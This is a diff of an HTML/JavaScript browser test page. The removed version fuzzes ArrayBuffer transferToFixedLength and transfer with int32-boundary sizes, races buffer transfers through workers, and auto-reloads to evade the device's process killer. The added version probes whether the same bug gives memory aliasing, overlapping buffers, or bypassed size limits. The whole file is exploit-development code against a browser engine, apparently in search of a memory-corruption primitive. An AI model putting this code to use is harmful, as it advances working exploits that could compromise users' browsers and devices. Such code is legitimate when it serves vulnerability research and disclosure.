@@ -1,79 +1,75 @@
 <!doctype html>
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>TA-RACE v10</title>
-<body style="background:#000;color:#0f0;font:13px monospace;white-space:pre-wrap;margin:8px">
-<div id=o>[TA-RACE v10] transferToFixedLength int32-boundary + auto-reload</div>
+<title>ALIAS-PROBE</title>
+<body style="background:#000;color:#0f0;font:14px monospace;white-space:pre-wrap;margin:10px">
+<div id=o>[ALIAS-PROBE] realloc-vs-confusion decisive test</div>
 <script>
 const o=document.getElementById('o');
-const log=m=>{o.textContent+="\n"+m;};
+const log=m=>o.textContent+="\n"+m;
 window.addEventListener('error',e=>log("[ERROR] "+e.message));
-log("[*] UA: "+navigator.userAgent);
-
-// auto-reload before jetsam (CPU limit is over 180s window)
-setTimeout(()=>location.reload(), 90000);
-
-// sizes crossing the int32 boundary (Oct-27 x2 signature = 0x80000000)
-const SIZES=[0x7FFFFFF0,0x7FFFFFFF,0x80000000,0x80000001,0xFFFFFFFF,0x100000000,0x100000008,0x1FFFFFFFF];
-const CTORS=[Uint8Array,Uint32Array,Float64Array];
-
-// W1: direct transferToFixedLength boundary fuzz on resizable buffers
-const wT=new Worker(URL.createObjectURL(new Blob([`
-onmessage=e=>{
-  const S=e.data.sizes;
-  for(let round=0;round<100000;round++){
-    for(const n of S){
-      for(const C of [Uint8Array,Float64Array]){
-        try{
-          const es=C.BYTES_PER_ELEMENT;
-          const ab=new ArrayBuffer(64,{maxByteLength:0x100000});
-          // n in bytes; also try n as element count
-          const out=ab.transferToFixedLength(n);
-          const bl=out.byteLength;
-          if(bl>0x100000){ postMessage({hit:1,n:n,es:es,bl:bl,round:round}); }
-          // write pattern + read back OOB
-          const v=new C(out);
-          if(v.length>0){ v[0]=1.1; const probe=v[v.length-1]; if(probe!==undefined) postMessage({probe:1,n:n,len:v.length}); }
-        }catch(_){}
-        try{
-          const ab2=new ArrayBuffer(64,{maxByteLength:0x100000});
-          const out2=ab2.transfer(n); // transfer with fixed length = same path family
-          if(out2.byteLength>0x100000) postMessage({hit:2,n:n,bl:out2.byteLength,round:round});
-        }catch(_){}
-      }
-    }
-  }
-  postMessage({done:1});
-};`])));
-wT.onmessage=e=>{
-  const d=e.data;
-  if(d.done){log("W1 done");return;}
-  log("HIT "+JSON.stringify(d));
-  if(d.bl){ try{ log("serializing..."); structuredClone; }catch(_){} }
-};
-
-// W2: transfer ring (transferAnchors CAS race) - light
-const wR=new Worker(URL.createObjectURL(new Blob([`
-onmessage=e=>{ for(const ab of e.data.abs){
-  let out=ab;
-  try{ out=(Math.random()<0.5)?ab.transfer():ab.transferToFixedLength(4096); }catch(_){}
-  try{ postMessage({abs:[out]},[out]); }catch(_){}
-} };
-`])));
-let inFlight=0;
-wR.onmessage=e=>{ for(const ab of e.data.abs){ inFlight--; try{wR.postMessage({abs:[ab]},[ab]);inFlight++;}catch(_){} } };
-wT.postMessage({sizes:SIZES});
+log("[*] start");
 
 (async()=>{
-  let it=0;
-  log("[*] main loop");
-  while(true){
-    if(inFlight<16){
-      const ab=new ArrayBuffer(256,{maxByteLength:2048});
-      try{ab.resize(512+(it&1023));}catch(_){}
-      try{wR.postMessage({abs:[ab]},[ab]);inFlight++;}catch(_){}
-    }
-    it++;
-    if((it&0x3FF)===0){log("[*] it="+it+" inflight="+inFlight);await new Promise(r=>setTimeout(r,50));}
+// T1: write pattern into huge buffer at a HIGH offset, then scan fresh small allocations for it
+try{
+  const ab=new ArrayBuffer(64,{maxByteLength:0x100000});
+  const huge=ab.transferToFixedLength(0x7FFFFFF0);
+  log("T1: huge.bl="+huge.byteLength);
+  const v=new Uint8Array(huge);
+  const MARK=0xC7;
+  // write marker at several high offsets (stay under 2GB to avoid wild pointer deref if confused... 
+  // 0x7FFFFFF0 is within signed positive; offsets in-bounds of the claim)
+  for(const off of [0x100000, 0x4000000, 0x20000000, 0x7FFFF000]){
+    v[off]=MARK;
   }
+  log("T1: markers written");
+  // now allocate small buffers and scan for MARK
+  let alias=0;
+  for(let i=0;i<2000;i++){
+    const s=new ArrayBuffer(0x1000);
+    const u=new Uint8Array(s);
+    u.fill(0xAA);
+    for(let j=0;j<0x1000;j++){
+      if(u[j]===MARK && (j===0||u[j-1]!==MARK)){ alias++; if(alias<5) log("T1 ALIAS i="+i+" off=0x"+j.toString(16)); }
+    }
+    if((i%500)===0){log("T1 i="+i+" alias="+alias);await new Promise(r=>setTimeout(r,0));}
+  }
+  log("T1 done alias="+alias+(alias>0?" *** MEMORY CONFUSION ***":" (clean realloc — spec bug only)"));
+}catch(e){log("T1: "+e.name);}
+
+// T2: overlap two huge buffers, write via one, read via other
+try{
+  const a1=new ArrayBuffer(64,{maxByteLength:0x100000}).transferToFixedLength(0x7FF00000);
+  const a2=new ArrayBuffer(64,{maxByteLength:0x100000}).transferToFixedLength(0x7FF00000);
+  const v1=new Uint8Array(a1), v2=new Uint8Array(a2);
+  v1[0x10000]=0xD1;
+  log("T2: v2[0x10000]=0x"+v2[0x10000].toString(16)+(v2[0x10000]===0xD1?" *** OVERLAP ***":" (disjoint)"));
+  v1[0x3FFF0000]=0xD2;
+  log("T2: v2[0x3FFF0000]=0x"+v2[0x3FFF0000].toString(16)+(v2[0x3FFF0000]===0xD2?" *** OVERLAP-HIGH ***":" (disjoint-high)"));
+}catch(e){log("T2: "+e.name);}
+
+// T3: does resize() still enforce maxByteLength on the result?
+try{
+  const ab=new ArrayBuffer(64,{maxByteLength:0x100000});
+  const h=ab.transferToFixedLength(0x7FFFFFF0);
+  h.resize(0x200000);
+  log("T3: resize smaller ok, bl="+h.byteLength);
+  h.resize(0x8000000);
+  log("T3: resize to 128MB (over old 1MB max): bl="+h.byteLength+(h.byteLength===0x8000000?" *** MAX NOT ENFORCED ***":" (enforced)"));
+}catch(e){log("T3: "+e.name);}
+
+// T4: many huge buffers — memory pressure behavior
+try{
+  const arr=[];
+  for(let i=0;i<50;i++){
+    const h=new ArrayBuffer(64,{maxByteLength:0x100000}).transferToFixedLength(0x7FFFFFF0);
+    arr.push(h);
+  }
+  log("T4: 50 x 2GB-claim buffers created OK (spec says impossible)");
+  const v=new Uint8Array(arr[49]);
+  v[0x7FFFF000]=1;
+  log("T4: write to last buffer's far end OK");
+}catch(e){log("T4: "+e.name);}
+log("DONE");
 })();
 </script>
